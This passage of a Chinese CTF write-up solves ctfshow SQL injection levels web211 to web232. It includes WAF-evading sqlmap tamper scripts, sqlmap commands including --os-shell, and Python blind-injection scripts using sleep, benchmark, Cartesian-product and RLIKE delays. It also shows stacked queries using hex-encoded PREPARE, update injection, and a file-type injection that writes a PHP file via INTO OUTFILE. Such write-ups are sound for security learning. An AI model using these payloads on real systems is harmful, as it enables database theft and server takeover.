space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"/**/\"\n                    continue\n            elif payload[i] == '\\'':\n                quote = not quote\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"/**/\"\n                continue\n            retVal += payload[i]\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n### web212\n\n#211plus版tamper\n\n![image-20250117223724691](../image/achieve/202411/sql注入--ctfshow/image-20250117223724691-1747825292263-49.png)\n\n就是前几个脚本waf的集合\n\n```\npython\n#!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x0a)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n            \n            elif payload[i] == '*':\n                retVal += chr(0x0a)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x0a)\n                continue\n\n            retVal += payload[i]\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/api/index.php --method=\"PUT\" --data=\"id=1\" --user-agent=sqlmap --referer=\"http://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/sqlmap.php\" --cookie=\"PHPSESSID=urnvf6582lubt0pjrr5sk518q2;\" --header=\"Content-Type:text/plain\" --safe-url=https://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web212.py --batch -D ctfshow_web -T ctfshow_flavis --dump\n```\n\n### web213\n\n![image-20250117225756063](../image/achieve/202411/sql注入--ctfshow/image-20250117225756063-1747825292263-51.png)\n\n考的是用–os-shell参数去getshell\n\nos-shell的使用条件\n（1）网站必须是root权限\n（2）攻击者需要知道网站的绝对路径\n（3）GPC为off，php主动转义的功能关闭\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u \"https://a58afa16-b03f-4cca-869b-640aca35b94d.challenge.ctf.show/api/index.php\" --safe-url=\"https://a58afa16-b03f-4cca-869b-640aca35b94d.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --method=PUT --data \"id=1\" --header=Content-Type:text/plain --user-agent=sqlmap --cookie=\"PHPSESSID=u1193e84h0fp64kqv00rd6ubt5\" --tamper=web212.py --referer=ctf.show --os-shell\n```\n\n![image-20250117230455364](../image/achieve/202411/sql注入--ctfshow/image-20250117230455364-1747825292263-53.png)\n\n选择服务器类型\n\n1. **ASP (Active Server Pages)**: 一种由微软开发的服务器端脚本技术，允许开发者在网页中嵌入 VBScript 或 JScript 代码。\n2. **ASPX**: 是 [ASP.NET](http://asp.net/) 的页面文件扩展名，[ASP.NET](http://asp.net/) 是微软的一个Web开发框架，支持多种编程语言（如 C# 和 [VB.NET](http://vb.net/)），用于创建动态网页和Web应用程序。\n3. **JSP (JavaServer Pages)**: 一个由 Java 提供支持的技术，允许在 HTML 页面中嵌入 Java 代码，以生成动态内容。\n4. **PHP**: 一种广泛使用的开源脚本语言，主要用于Web开发，允许开发者将代码嵌入到HTML中。它是您提到的默认语言。\n\n## 时间盲注\n\n### web214\n\n没找到参数，我记得之前有一个工具是可以探测参数的\n\nArjun\n\n也可以在index下的select.js中看到参数\n\n![image-20250504175219845](../image/achieve/202411/sql注入--ctfshow/image-20250504175219845.png)\n\n```\nip=1&debug=1\n```\n\n这里debug得设为1才能出现回显\n\n![image-20250504175356220](../image/achieve/202411/sql注入--ctfshow/image-20250504175356220.png)\n\nip是查询语句中的参数，看一下延迟时间\n\n```\nip=1 or sleep(2)#&debug=1\n```\n\n大概两秒左右，那其实是差不多，写脚本吧\n\n```python\nimport requests\nimport time\n\nurl = \"http://03356e28-c215-4129-97db-2f9864c35ca2.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail :\n        mid = (head + tail) // 2\n        #payload = \"if(ascii(substr(database(),{0},1))>{1},sleep(4),0)#\".format(i,mid)\n        #payload = \"if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},sleep(4),1)#\".format(i,mid)\n        #payload = \"if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagx'),{0},1))>{1},sleep(4),1)#\".format(i, mid)\n        payload = \"if(ascii(substr((select flaga from ctfshow_flagx),{0},1))>{1},sleep(4),1)#\".format(i, mid)\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1,\n        }\n        print(data)\n        start_time = time.time()\n        r = requests.post(url, data=data)\n        request_time = time.time() - start_time\n\n        if request_time > 3:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32 :\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag)\n```\n\n### web215\n\n这次是字符型，用了单引号，去闭合就行了\n\n```\nip=1' or sleep(2)#&debug=1\n```\n\n然后写脚本\n\n```python\nimport requests\nimport time\n\nurl = \"http://9a7beb5f-6196-4c37-ae56-b0bf74a95924.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"' or if(ascii(substr(database(),{i},1))>{mid},sleep(3),0)#\"\n        #payload = f\"' or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(3),0)#\"\n        #payload = f\"' or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))>{mid},sleep(3),0)#\"\n        payload = f\"' or if(ascii(substr((select flagaa from ctfshow_flagxc),{i},1))>{mid},sleep(3),0)#\"\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1\n        }\n        start_time = time.time()\n        r = requests.post(url, data=data)\n        end_time = time.time() - start_time\n\n        if end_time > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag)\n```\n\n### web216\n\n```\nselect id from ctfshow_info where ip = from_base64(1);\n```\n\n还是一样，闭合就行了\n\n```\nip=1) or sleep(3)#&debug=1\n```\n\n脚本\n\n```python\nimport requests\nimport time\n\nurl = \"http://c3d07a22-e8ee-4b69-9fe0-2b5900d6720e.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1) or if(ascii(substr(database(),{i},1))>{mid},sleep(3),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(3),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxcc'),{i},1))>{mid},sleep(3),0)#\"\n        payload = f\"' or if(ascii(substr((select flagaac from ctfshow_flagxcc),{i},1))>{mid},sleep(3),0)#\"\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1\n        }\n        start_time = time.time()\n        r = requests.post(url, data=data)\n        end_time = time.time() - start_time\n\n        if end_time > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag)\n```\n\n### web217\n\n过滤了sleep函数，可以用benchmark函数去绕过\n\n```python\nimport requests\nimport time\n\nurl = \"http://c9b5a9bb-df7d-4de0-9eed-7f5dff7b66d0.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1) or if(ascii(substr(database(),{i},1))>{mid},benchmark(1000000,md5('1')),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow_web'),{i},1))>{mid},benchmark(10000000, MD5('test')),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxccb'),{i},1))>{mid},benchmark(10000000, MD5('test')),0)#\"\n        payload = f\"1）or if(ascii(substr((select flagaabc from ctfshow_flagxccb),{i},1))>{mid},benchmark(100000000, MD5('test')),0)#\"\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1\n        }\n        print(data)\n        start_time = time.time()\n        r = requests.post(url, data=data)\n        end_time = time.time() - start_time\n\n        if end_time > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag)\n```\n\n不得不说这个时间确实不太稳定，后面爆数据的时候把benchmark的次数改了很多次\n\n### web218\n\n![image-20250505120400822](../image/achieve/202411/sql注入--ctfshow/image-20250505120400822.png)\n\n查询语句变了，参数是id，这次sleep和benchmark函数都被禁用了，但是这里的话输入点还是和之前是一样的\n\n```\nselect id from ctfshow_info where ip = (1);\n```\n\n这里的话可以用笛卡尔积去做\n\n![image-20250505123048957](../image/achieve/202411/sql注入--ctfshow/image-20250505123048957.png)\n\n那就测一下延迟吧\n\n不得不说这个测的真挺麻烦的，每次要么太少要么太多\n\n如果是用columns的话两个太少三个太多，最后还是决定用三个tables的\n\n```mysql\nip=1) or if(ascii(substr(database(),1,1))>0,(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)%23&debug=1\n```\n\n那就写脚本吧\n\n```python\nimport requests\nimport time\n\nurl = \"http://e37fb63a-1945-44db-9885-cfa468e30d51.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))>{mid},(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#\"\n        payload = f\"1) or if(ascii(substr((select flagaac from ctfshow_flagxc),{i},1))>{mid},(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#\"\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1,\n        }\n        print(payload)\n        start = time.time()\n        r = requests.post(url, data=data)\n        end = time.time() - start\n\n        if end > 1:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else:\n        break\nprint(flag)\n```\n\n回来做一下rlike的做法，常规测延迟\n\n```\nip=1) or if(ascii(substr(database(),1,1))>0,(select concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE concat(repeat('(a.*)+',7),'b')),0)#&debug=1\n```\n\n测了大半天才测出来，延迟大概4s左右，照着改脚本就行\n\n### web219\n\n才发现上把预期是用rlike去打盲注的，那又得返回去做一下，既然这样的话那这道题就是用笛卡尔积去做的\n\n```\nip=1)+or+if(ascii(substr(database()%2c1%2c1))%3e0%2c(SELECT+count(*)+FROM+information_schema.tables+A%2c+information_schema.tables+B%2c+information_schema.schemata+D%2c+information_schema.schemata+E%2c+information_schema.schemata+F%2cinformation_schema.schemata+G)%2c0)%23&debug=1\n```\n\n这里的话刚好延迟是3-4s左右\n\n```python\nimport requests\nimport time\n\nurl = \"http://91f68e53-629c-42c8-9ba1-dc0fa6092341.challenge.ctf.show/api/\"\ni = 0\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1) or if(ascii(substr(database(),{i},1))>{mid},(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow_web'),{i},1))>{mid},(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        #payload = f\"1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxca'),{i},1))>{mid},(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        payload = f\"1) or if(ascii(substr((select flagaabc from ctfshow_flagxca),{i},1))>{mid},(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        data = {\n            \"ip\" : payload,\n            \"debug\" : 1,\n        }\n        start = time.time()\n        r = requests.post(url, data=data)\n        end = time.time() - start\n\n        if end > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else:\n        break\nprint(flag)\n```\n\n### web220\n\n```\n//屏蔽危险分子\nfunction waf($str){\n    return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);\n}   \n```\n\n这里过滤还是挺多的，但是之前也学过绕过的方法了\n\n字符集遍历绕过ascii就行，left+like绕过substr和mid，然后盲注的话用笛卡尔就行\n\n试着写一下payload\n\n```\nip=1) or if(left(database(),{i})= \\\"{flag+j}\\\",(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&debug=1\n```\n\n大概延迟6-7秒左右，不管了，慢点就慢点吧\n\n但是发现这几个切片函数都不能和`group_concat`共用，用limit语句限制一下输出吧\n\n脚本\n\n```python\nimport requests\nimport time\n\nurl = \"http://fcd017bc-038f-40e2-9f43-f2055436b4d9.challenge.ctf.show/api/\"\nstrings=\"_-{}abcdefghijklmnopqrstuvwxyz0123456789\"\n\ntarget = \"\"\nfor i in range(1,100):\n    found = 0\n    for j in strings:\n        #payload = f\"1) or if(left(database(),{i})= \\\"{target+j}\\\",(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        #payload = f\"1) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{i})= \\\"{target+j}\\\",(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        #payload = f\"1) or if(left((select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1),{i})= \\\"{target+j}\\\",(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        payload = f\"1) or if(left((select flagaabcc from ctfshow_flagxcac limit 0,1),{i})= \\\"{target+j}\\\",(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#\"\n        #print(payload)\n        data = {\n            \"ip\": payload,\n            \"debug\": 1,\n        }\n        start = time.time()\n        r = requests.post(url, data=data)\n        end = time.time() - start\n        if end >= 4:\n            found = 1\n            target += j\n            print(target)\n            break\n    if not found:\n        print(target)\n        exit()\n```\n\n## 其他注入\n\n### limit注入\n\n### web221\n\n查询语句\n\n```\n  //分页查询\n  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;\n      \n```\n\n返回逻辑\n\n```\n//TODO:很安全，不需要过滤\n//拿到数据库名字就算你赢\n```\n\n这里的话就是limit注入了，这里有两个参数$page和$limit，测试一下\n\n```\n?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)\n回显\n{\"code\":0,\"msg\":\"\\u67e5\\u8be2\\u5931\\u8d25XPATH syntax error: '~10.3.18-MariaDB'\",\"count\":\"0\",\"data\":[]}\n```\n\n拿数据库\n\n```\n?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1)\n回显\n{\"code\":0,\"msg\":\"\\u67e5\\u8be2\\u5931\\u8d25XPATH syntax error: '~ctfshow_web_flag_x'\",\"count\":\"0\",\"data\":[]}\n```\n\n数据库名字就是flag\n\n### group注入\n\n### web222\n\n查询语句\n\n```\n  //分页查询\n  $sql = select * from ctfshow_user group by $username;\n      \n```\n\n返回逻辑\n\n```\n//TODO:很安全，不需要过滤\n```\n\ngroup注入有两种，报错和延迟，这里的话没回显，直接打延迟，参数是u\n\n```\n/api/?u=if(ascii(substr(database(),1,1))>0,sleep(1),1)if(ascii(substr(database(),1,1))>0,sleep(1),1)\n```\n\n发现一共延迟了21s左右，估计有21条数据，我们用sleep(0.2)吧\n\n写脚本\n\n```python\nimport requests\nimport time\n\nurl = \"http://ebfe1f77-39ae-4732-9e96-edfeb30a0bf9.challenge.ctf.show/api/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload = f\"?u=if(ascii(substr((select database()),{i},1))>{mid},sleep(0.2),1)\"\n        #数据库名ctfshow_web\n        #payload = f\"?u=if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(0.2),1)\"\n        #数据表名ctfshow_flaga\n        #payload = f\"?u=if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flaga'),{i},1))>{mid},sleep(0.2),1)\"\n        #字段名flagaabc\n        payload = f\"?u=if(ascii(substr((select flagaabc from ctfshow_flaga),{i},1))>{mid},sleep(0.2),1)\"\n        start = time.time()\n        r = requests.get(url + payload)\n        end = time.time() - start\n\n        if end > 3:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n### web223\n\n这道题是过滤了数字的，用true去构造就行，但是这里sleep(true)的话又得跑好久，所以直接打布尔盲注\n\n```\n?u=if(ascii(substr((select database()),{real_i},true))>{real_mid},username,false)\n```\n\n语句正确的回显\n\n```\n?u=if(ascii(substr((select%20database()),true,true))>false,username,false)\n返回\n{\"code\":0,\"msg\":\"\\u67e5\\u8be2\\u6210\\u529f\",\"count\":1,\"data\":[{\"id\":\"1\",\"username\":\"ctfshow\",\"pass\":\"ctfshow\"},{\"id\":\"2\",\"username\":\"user1\",\"pass\":\"111\"},{\"id\":\"3\",\"username\":\"user2\",\"pass\":\"222\"},{\"id\":\"4\",\"username\":\"userAUTO\",\"pass\":\"passwordAUTO\"}]}\n```\n\n语句错误的回显\n\n```\n?u=if(ascii(substr((select%20database()),true,true))<false,username,false)\n返回\n{\"code\":0,\"msg\":\"\\u67e5\\u8be2\\u6210\\u529f\",\"count\":1,\"data\":[{\"id\":\"1\",\"username\":\"ctfshow\",\"pass\":\"ctfshow\"}]}\n```\n\n然后写脚本就行\n\n```python\nimport requests\n\nurl = \"http://1207941e-aa7a-4183-86da-2417300bb4e0.challenge.ctf.show/api/\"\ni = 0\ntarget = \"\"\n\ndef createNum(n):\n    num = 'true'\n    if n == 1:\n        return 'true'\n    else:\n        for i in range(n - 1):\n            num += \"+true\"\n        return num\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        real_mid = createNum(mid)\n        real_i = createNum(i)\n\n        #payload = f\"if(ascii(substr(database(),{real_i},true))>{real_mid},username,false)\"\n        #数据库名ctfshow_web\n        #payload = f\"if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow_web'),{real_i},true))>{real_mid},username,false)\"\n        #数据表名ctfshow_flagas\n        #payload = f\"if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagas'),{real_i},true))>{real_mid},username,false)\"\n        #列名flagasabc\n        payload = f\"if(ascii(substr((select flagasabc from ctfshow_flagas),{real_i},true))>{real_mid},username,false)\"\n        params={\"u\":payload}\n        r=requests.get(url,params=params)\n        # print(r.text)\n        if \"passwordAUTO\" in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n```\n\n### web224\n\n一个登录界面\n\n![image-20250507185316118](../image/achieve/202411/sql注入--ctfshow/image-20250507185316118.png)\n\n扫目录扫出来一个robots.txt文件，访问拿到/pwdreset.php，重置一下密码然后登录就行，然后就是文件上传\n\nfuzz一下一直没fuzz出来具体的绕过\n\n看了 wp 是文件类型注入，后台会通过读取文件内容判断文件类型，记录到数据库，对文件进行重命名。\n\n然后我们新建一个txt文件，写入\n\n```\nC64File \"');select 0x3c3f3d20706870696e666f28293b3f3e into outfile '/var/www/html/test.php';--+\n```\n\n这里的话`0x3c3f3d20706870696e666f28293b3f3e`是`<?= phpinfo();?>`的十六进制\n\nC64File 是与 Commodore 64 相关的文件类型，前边的C64File是为了绕过类型检测，之后闭合，写入 sql 语句，进行测试一下\n\n访问filelist.php发现这里会对我们传入的文件进行重命名\n\n![image-20250507192231315](../image/achieve/202411/sql注入--ctfshow/image-20250507192231315.png)\n\n\n\n访问我们刚刚传入的文件\n\n![image-20250507192406679](../image/achieve/202411/sql注入--ctfshow/image-20250507192406679.png)\n\n成功执行，然后我们进行ls\n\n![image-20250507192617068](../image/achieve/202411/sql注入--ctfshow/image-20250507192617068.png)\n\n想看一下check的机制是什么样的，读取upload.php\n\n```php\n<?php\nerror_reporting(0);\n\nif ($_FILES[\"file\"][\"error\"] > 0) {\n    die(\"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br />\");\n}\n\nif ($_FILES[\"file\"][\"size\"] > 10 * 1024) {\n    die(\"文件过大: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb<br />\");\n}\n\nif (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) {\n    echo $_FILES[\"file\"][\"name\"] . \" already exists. \";\n} else {\n    $filename = md5(md5(rand(1, 10000))) . \".zip\";\n    $filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n    \n    if (preg_match(\"/image|png|bmap|jpg|jpeg|application|text|audio|video/i\", $filetype)) {\n        die(\"file type error\");\n    }\n    \n    $filepath = \"upload/\" . $filename;\n    $sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\" . $filename . \"','\" . $filepath . \"','\" . $filetype . \"');\";\n    \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $filename);\n    \n    $con = mysqli_connect(\"localhost\", \"root\", \"root\", \"ctf\");\n    if (!$con) {\n        die('Could not connect: ' . mysqli_error());\n    }\n    \n    if (mysqli_multi_query($con, $sql)) {\n        header(\"location:filelist.php\");\n    } else {\n        echo \"Error: \" . $sql . \"<br>\" . mysqli_error($con);\n    }\n    \n    mysqli_close($con);\n}\n?>\n```\n\n注意这里的sql语句\n\n```php\n    $sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\" . $filename . \"','\" . $filepath . \"','\" . $filetype . \"');\";\n```\n\n这里可以看到filename和filepath都是不可控的，唯有filetype是可控的，然后我们看filetype的赋值机制\n\n```\n$filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n```\n\n- finfo类：finfo是一个类，里面有方法open,file\n- finfo_open：finfo_open -- finfo::__construct — 创建新 finfo 实例，这个函数的作用是打开一个文件，通常和finfo::file(finfo_file)在一起使用,\n- finfo_file:返回一个文件的信息\n\n本地测试一下\n\n```php\n<?php\n$filetype = (new finfo)->file('1.txt');\nvar_dump($filetype);\n```\n\n然后我们创建一个1.txt\n\n```\nC64File \"');select 0x3c3f3d60746163202f666c2a603f3e into outfile '/var/www/html/file1.php';--+\n```\n\n运行php后执行结果\n\n```\nstring(107) \"PC64 Emulator file \"\"');select 0x3c3f3d60746163202f666c2a603f3e into outfile '/var/www/html/file1.php';--+\"\"\n```\n\n可以发现这里成功插入了我们的数据，也就是说我们代码中的filetype，然后这里拼接到sql语句中造成注入\n\n### 堆叠注入提升\n\n### web225\n\n查询语句\n\n```php\n  //分页查询\n  $sql = \"select id,username,pass from ctfshow_user where username = '{$username}';\";\n      \n```\n\n返回逻辑\n\n```php\n  //师傅说过滤的越多越好\n  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){\n    die(json_encode($ret));\n  }\n```\n\n这里的话过滤了很多啊，但是show可以用，试着看一下\n\n```\n/api/?username=-1';show databases;--+\n/api/?username=-1';show tables;--+\n/api/?username=-1';show tables;show columns from ctfshow_web.ctfshow_flagasa;--+\n```\n\n输出\n\n```\ndata\":[{\"Tables_in_ctfshow_web\":\"ctfshow_flagasa\"},{\"Tables_in_ctfshow_web\":\"ctfshow_user\"}]}\n```\n\n出来表名了，但是操作表的函数都被禁了，翻了一下可以用handler\n\n```\n?username=-1';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;--+\n```\n\n这个表只有一行数据，直接就出来了\n\n### web226\n\n```php\n  //师傅说过滤的越多越好\n  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i',$username)){\n    die(json_encode($ret));\n  }\n```\n\n多过滤了show和(，上面的方法不能用了，但是可以用预处理语句\n\n这里因为过滤了查询语句，所以用十六进制编码绕过\n\n```html\n?username=-1';PREPARE test from 0x73686f7720646174616261736573;execute test;--+\nctfshow_web\n\n?username=-1';PREPARE test from 0x73686f77207461626c6573;execute test;--+\nctfsh_ow_flagas\n\n?username=-1';PREPARE test from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute test;--+\ndata\":[{\"id\":\"1\",\"flagasb\":\"ctfshow{f48205fc-3fcc-42c3-9ca7-bb5ee5018ded}\",\"info\":\"you get it\"}]}\n```\n\n### web227\n\n```\n //师傅说过滤的越多越好\n  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\\,/i',$username)){\n    die(json_encode($ret));\n  }\n```\n\n比之前多了一个db和逗号，但是貌似不影响我们的操作\n\n```\n?username=-1';PREPARE test from 0x73686f7720646174616261736573;execute test;--+\nctfshow_web\n```\n\n但是貌似flag不在表中，翻了一阵子都没翻到，那就看看存储过程\n\n`Routines` 是information_schema中的一个表，存储所有存储过程和函数的定义信息\n\n```\n?username=-1';PREPARE test from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute test;--+\n```\n\n### web228-230\n\n这里看不到过滤了，但是之前的方法也能用\n\n这里放出web228的payload，其他的改一下表名就行\n\n```\n?username=-1';PREPARE test from 0x73686f7720646174616261736573;execute test;--+\n\n?username=-1';PREPARE test from 0x73686f77207461626c6573;execute test;--+\n\n?username=-1';PREPARE test from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761736161;execute test;--+\n```\n\n## update 注入\n\n### web231\n\n```\n$sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\";\n```\n\n更新一条数据，参数可控，这里的话可以直接注入username，让username的内容更新为我们的sql查询语句的结果\n\n一直以为是GET传参，结果发现是post\n\n```\npassword=ctfshow',username=(select database())%23&username=nonono\n数据库名：ctfshow_web\n\npassword=ctfshow',username=(select group_concat(table_name)from information_schema.tables where table_schema=database())%23&username=nonono\n数据表名：banlist,ctfshow_user,flaga\n\npassword=ctfshow',username=(select group_concat(column_name)from information_schema.columns where table_name='flaga')%23&username=nonono\n字段名：id,flagas,info\n\npassword=ctfshow',username=(select flagas from flaga)%23&username=nonono\n```\n\n### web232\n\n```\n$sql = \"update ctfshow_user set pass = md5('{$password}') where username = '{$username}';\";\n```\n\n有md5加密函数，闭合就完事\n\n```\npassword=1'),username=(select 